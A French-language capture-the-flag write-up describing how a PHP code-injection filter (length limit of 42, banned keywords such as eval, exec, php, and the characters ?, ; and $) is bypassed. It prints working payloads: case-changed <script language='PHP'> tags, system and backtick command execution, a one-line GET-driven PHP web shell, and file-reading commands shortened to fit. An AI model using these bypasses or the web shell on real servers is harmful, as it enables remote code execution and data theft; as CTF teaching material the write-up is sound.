# Misc 250 - Outsmarter Filter

L'énonce nous indique que nous devons réaliser une RCE pour
valider l'épreuve mais qu'un filtre est présent. Le filtre recherche :
- Texte de moins de 42 caractères
- Banissement des mots clefs : eval shell exec popen php
- Banissement des opérateurs : ? et ; et $

On va essayer d'injecter du code PHP pour faire notre RCE, nous
testons un simple :
> <?php echo "test"; ?>

Le filtre détecte nos "?", ";" et "php". 
Après avoir regardé la documentation on apprend qu'il est possible
de remplacer la balise php par script language=php, on est débarrassé de nos "?" mais de notre "php".

Et si le script n'était pas sensible à la casse ? On teste notre payload avec "PHP"


><script language='PHP>echo 'Hello'</script>
taille : 42



Celui-ci s'exécute, nous avons donc passé la première partie du challenge, nous sommes capables
d'injecter des commandes PHP. Il nous faut maintenant trouver le flag, la première idée est de lister les
fichiers et dossiers. On essaie donc un appel à system car il n'est pas bloqué :)

><script language='PHP>system('ls')</script>
taille : 42

Le script fonctionne mais on n'obtient rien d'interesssant, on essaie d'afficher les fichiers cachés

><script language='PHP>system('ls -a')</script>
taille : 45


Malheureusement notre payload est trop grand 45 caractères alors que la limite est de 42..Il nous faut
trouver un moyen de le réduire.

Après quelques recherches sur "Mini Shell PHP", on trouve celui-ci : 
><?=@\`$_GET[c]`; 

Il n'est pas
adapté à cause de ses ";" et "?" mais on va le modifier pour l'utiliser.

Explication du shell
><?=@\`$_GET[c]`;

Execute la commande système grace aux backticks
Récupère une commande par GET
@ = Enleve les erreurs


On peut donc remplacer system('ls') par echo `ls`. Notre payload devient donc :

><script language='PHP>echo `ls`</script>
taille : 39

Parfait la taille est respectée mais on a toujours pas de fichier intéressant. Nous voulons alors inspecter
le contenu d'index.php :
><script language=PHP>echo `cat index.php`</script> taille 50

La taille de notre script est trop grande, on le réduit encore :

><script language='PHP>echo `cat i*`</script> taille 43
>
<script language='PHP>echo `cat *`</script> taille 42

><script language='PHP>echo`cat *`</script> taille 41
>

Le contenu des fichiers s'affiche, on peut voir le flag dans index.php “Well done, you found the flag :
**ese{RCE_4ll_th3_dummy_WAFs}**“